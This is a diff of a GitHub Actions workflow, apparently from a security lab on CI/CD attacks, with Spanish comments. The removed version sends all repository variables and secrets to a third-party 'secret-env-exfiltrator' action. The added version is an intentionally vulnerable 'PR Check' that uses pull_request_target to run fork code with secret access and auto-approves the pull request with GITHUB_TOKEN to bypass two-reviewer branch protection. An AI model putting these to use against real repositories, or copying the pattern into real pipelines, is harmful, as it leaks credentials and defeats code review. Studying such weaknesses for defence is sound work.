@@ -1,13 +1,27 @@
-name: Conseguir los secretos
+name: PR Check
 
-on: push
+on:
+  pull_request_target:          # ⚠️ VULNERABLE: acceso a secretos desde forks
+    types: [opened, synchronize]
 
 jobs:
-  exfil:
+  check:
     runs-on: ubuntu-latest
-    name: Esto conseguirá los secretos de GitHub Actions gracias a la acción de Offensive Actions
+
     steps:
-      - uses: offensive-actions/secret-env-exfiltrator@main
+      - name: Checkout código del PR
+        uses: actions/checkout@v4
         with:
-          vars: ${{ toJSON(vars) }}
-          secrets: ${{ toJSON(secrets) }}
+          ref: ${{ github.event.pull_request.head.sha }}  # ⚠️ Ejecuta código del fork
+
+      - name: Aprobar PR automáticamente
+        # ⚠️ VULNERABLE: funciona si el repositorio tiene activado
+        #    Settings → Actions → "Allow GitHub Actions to create and approve pull requests"
+        #    Con branch protection de 2 revisores, esto lo salta porque
+        #    el propio GITHUB_TOKEN cuenta como una aprobación válida.
+        run: |
+          gh pr review ${{ github.event.pull_request.number }} \
+            --approve \
+            --body "✅ Validación automática superada."
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
